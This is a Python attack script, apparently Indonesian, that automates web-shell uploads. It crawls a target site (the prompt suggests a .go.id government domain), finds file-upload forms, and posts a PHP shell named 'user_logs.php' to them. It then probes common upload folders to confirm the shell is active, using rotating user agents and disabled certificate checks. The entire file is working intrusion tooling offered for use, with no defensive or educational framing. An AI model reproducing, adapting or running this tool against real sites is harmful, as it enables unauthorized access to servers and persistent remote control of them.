
import requests
from bs4 import BeautifulSoup
import random
import time
import urllib3
urllib3.disable_warnings()

# List user-agent
user_agents = [f"Mozilla/5.0 (compatible; CustomUA/{i})" for i in range(100)]

# Shell file
SHELL_FILENAME = "user_logs.php"

def random_ua():
    return random.choice(user_agents)

def crawl_urls(domain):
    urls = set()
    try:
        r = requests.get(domain, timeout=10, verify=False, headers={"User-Agent": random_ua()})
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.find_all("a", href=True):
            href = a["href"]
            if href.startswith("http"):
                urls.add(href)
            elif href.startswith("/"):
                urls.add(domain.rstrip("/") + href)
    except Exception as e:
        print(f"[!] Gagal crawling {domain}: {e}")
    return urls

def find_upload_forms(url):
    try:
        r = requests.get(url, timeout=10, verify=False, headers={"User-Agent": random_ua()})
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        for form in forms:
            if form.find("input", {"type": "file"}):
                print(f"[+] Form upload ditemukan di: {url}")
                return url
    except Exception as e:
        print(f"[-] Gagal deteksi form di {url}: {e}")

def upload_shell(url):
    shell = (SHELL_FILENAME, open(SHELL_FILENAME, "rb"), "application/x-php")
    try:
        r = requests.post(url, files={"file": shell}, headers={"User-Agent": random_ua()}, timeout=15, verify=False)
        if r.status_code in [200, 201]:
            print(f"[✔] Upload berhasil di: {url}")
        else:
            print(f"[-] Gagal upload ke: {url}")
    except Exception as e:
        print(f"[!] Error saat upload: {e}")

def path_discovery(base_url):
    paths = ["uploads/", "files/", "images/", "upload/", "data/"]
    for path in paths:
        target = base_url.rstrip("/") + "/" + path + SHELL_FILENAME
        try:
            r = requests.get(target, timeout=10, verify=False)
            if r.status_code == 200 and "php" in r.text:
                print(f"[!!] Shell aktif di: {target}")
                return target
        except:
            pass

if __name__ == "__main__":
    target = input("[>] Masukkan URL target (cth: https://example.go.id): ").strip()
    urls = crawl_urls(target)
    for url in urls:
        form_url = find_upload_forms(url)
        if form_url:
            upload_shell(form_url)
            path_discovery(target)
            break
